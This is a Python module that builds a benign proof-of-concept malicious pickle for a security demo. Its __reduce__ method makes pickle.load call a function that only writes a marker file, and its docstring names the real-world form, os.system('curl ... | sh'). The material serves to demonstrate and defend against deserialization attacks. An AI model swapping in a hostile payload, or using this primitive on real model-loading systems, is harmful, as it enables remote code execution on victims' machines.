"""Construct a BENIGN pickle-deserialization PoC *at runtime*.

THREAT side of the project. A malicious pickle abuses `__reduce__`: when the
object is pickled, __reduce__ returns `(callable, args)`, and at *unpickle* time
the callable is invoked with those args. Real attackers put `os.system("curl ...
| sh")` there. We deliberately put a clearly-benign payload that only writes a
marker file, so the demo is safe to run yet faithfully reproduces the mechanism.

SAFETY INVARIANTS enforced here:
  * The payload callable is restricted to writing ONE marker file.
  * The pickle is generated in memory / written only to a caller-supplied path.
  * We NEVER commit a weaponized pickle to the repo (build_poc.py writes to a
    git-ignored / temp location, and the run script only loads it inside Docker
    with `--network none --read-only`).

This file builds the bytes; it does NOT unpickle them. Loading is the demo's job
and happens only in the sandboxed runner.
"""

from __future__ import annotations

import os
import pickle
from pathlib import Path

DEFAULT_MARKER = "/tmp/PWNED_DEMO"  # noqa: S108 - intentional, benign demo marker


def _benign_payload(marker_path: str) -> int:
    """The thing that 'runs' on unpickle. Benign: writes a marker file only."""
    Path(marker_path).write_text(
        "PWNED_DEMO: this text was written by code executing during "
        "pickle.load(). In a real attack this would be a reverse shell.\n"
    )
    return 0


class _MaliciousModel:
    """Mimics a 'model' object whose unpickling triggers code execution.

    `os.system` here only runs an `echo > marker` style write. We use a Python
    function reference (`_run_marker`) instead of a shell to keep it portable and
    obviously benign — no shell, no network, no file deletion.
    """

    def __init__(self, marker_path: str = DEFAULT_MARKER) -> None:
        self.marker_path = marker_path
        self.weights = [0.1, 0.2, 0.3]  # looks like a normal artifact

    def __reduce__(self):
        # Returns (callable, args_tuple): pickle.load will call it. THIS is the
        # exploit primitive. We point it at our benign marker writer.
        return (_run_marker, (self.marker_path,))


def _run_marker(marker_path: str) -> int:
    """Module-level callable so it is picklable via GLOBAL/REDUCE."""
    return _benign_payload(marker_path)


def build_benign_poc(marker_path: str = DEFAULT_MARKER) -> bytes:
    """Return the bytes of a benign malicious-style pickle. Does NOT load it."""
    return pickle.dumps(_MaliciousModel(marker_path), protocol=2)


def write_poc(out_path: str | Path, marker_path: str = DEFAULT_MARKER) -> Path:
    """Write the PoC pickle to a caller-chosen path (default: a temp/ignored path)."""
    out_path = Path(out_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(build_benign_poc(marker_path))
    return out_path


def marker_exists(marker_path: str = DEFAULT_MARKER) -> bool:
    return Path(marker_path).exists()


def cleanup_marker(marker_path: str = DEFAULT_MARKER) -> None:
    try:
        os.remove(marker_path)
    except FileNotFoundError:
        pass
